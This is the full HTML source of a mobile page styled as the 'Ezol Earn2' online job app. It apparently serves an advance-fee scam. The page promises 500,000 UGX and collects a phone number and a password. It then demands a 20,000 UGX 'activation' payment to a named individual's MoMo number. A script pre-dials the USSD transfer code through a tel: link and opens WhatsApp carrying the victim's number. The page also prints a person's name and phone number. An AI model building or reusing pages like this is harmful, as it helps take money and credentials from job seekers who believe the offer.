<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ezol Earn2 - Online Job App</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif}
body{background:#0f3d2e; color:#fff; min-height:100vh}
.top{background:linear-gradient(90deg,#1e5a45,#2e7d62); margin:12px; border-radius:14px; padding:10px 14px; display:flex; justify-content:space-between; align-items:center}
.top small{color:#ffeb3b; font-size:12px; line-height:1.3}
.logo{text-align:center; margin:18px 0}
.circle{width:110px; height:110px; margin:0 auto; border-radius:50%; background:radial-gradient(#2ecc71,#f1c40f); border:4px solid #fff; display:flex; align-items:center; justify-content:center; font-size:42px; box-shadow:0 8px 20px rgba(0,0,0,.3)}
.tabs{display:flex; gap:10px; padding:0 16px}
.tab{flex:1; padding:13px; border-radius:25px; border:none; font-weight:700}
.tab1{background:#1e6d55; color:#fff; border:1px solid #3a9a7e}
.tab2{background:linear-gradient(#ffda6a,#ff9f1a); color:#3a2000}
.card{background:#fffff8; color:#222; margin:16px; border-radius:18px; padding:16px}
.input{display:flex; gap:8px; align-items:center; background:#f3f3ef; border:1px solid #e5e5e0; border-radius:12px; padding:11px; margin-bottom:11px}
.input input{border:none; background:none; outline:none; flex:1}
.pay{display:none; background:#fff; color:#111; margin:16px; border-radius:18px; padding:18px}
.pay button{width:100%; padding:14px; border-radius:12px; border:none; font-weight:800; font-size:16px}
.btn-pay{background:#ff9f1c}
</style>
</head>
<body>
<div class="top"><small>📱 Download APP for better experience.<br>Experience & receive <b>500,000 UGX</b></small><span style="background:#3dd68c; padding:8px; border-radius:50%">📲</span></div>
<div class="logo"><div class="circle">🌾$</div><h3 style="margin-top:8px; letter-spacing:1px">Ezol Earn2 - Online Job</h3></div>
<div id="auth">
<div class="tabs"><button class="tab tab1">Sign in</button><button class="tab tab2" onclick="register()">Register</button></div>
<div class="card">
<div class="input"><span>🇺🇬 +256</span><input id="phone" placeholder="Enter phone number"></div>
<div class="input"><span>🔒</span><input id="p1" type="password" placeholder="Enter password"></div>
<div class="input"><span>🔒</span><input id="p2" type="password" placeholder="Re-enter password"></div>
</div>
</div>
<div id="pay" class="pay">
<h3 style="text-align:center">Auto Pay Activation</h3>
<p style="margin:12px 0; font-size:14px">Phone: <b id="uPhone"></b></p>
<div style="background:#f0faf0; border:1px dashed #2a7d5f; padding:10px; border-radius:10px; font-size:13px">
Pay To: <b>0795143386</b><br>Names: Ezra Twinamatsiko<br>Network: MTN MoMo / Airtel</div>
<div class="input" style="margin-top:12px"><span>UGX</span><input id="amt" value="20000"></div>
<button class="btn-pay" onclick="payNow()">Pay Now to 0795143386</button>
<button onclick="navigator.clipboard.writeText('0795143386');alert('Copied 0795143386')" style="background:#eee; margin-top:8px">Copy Number</button>
<p id="msg" style="text-align:center; margin-top:10px; color:green; font-weight:700"></p>
</div>
<script>
function register(){
 let ph=document.getElementById('phone').value, a=document.getElementById('p1').value, b=document.getElementById('p2').value;
 if(ph.length<9)return alert('Enter phone');
 if(a!=b)return alert('Passwords not match');
 localStorage.setItem('ezol_phone',ph);
 document.getElementById('auth').style.display='none';
 document.getElementById('pay').style.display='block';
 document.getElementById('uPhone').innerText='+256'+ph;
}
function payNow(){
 let amt=document.getElementById('amt').value;
 let num='0795143386';
 let ussd=`*165*1*1*${num}*${amt}#`;
 document.getElementById('msg').innerText='Opening MoMo... '+ussd;
 window.location.href='tel:'+encodeURIComponent(ussd);
 setTimeout(()=>{window.open('https://wa.me/256795143386?text=Ezol%20Earn2%20Payment%20'+amt+'%20from%20%2B256'+localStorage.getItem('ezol_phone'),'blank')},1200);
}
</script>
</body>
</html>
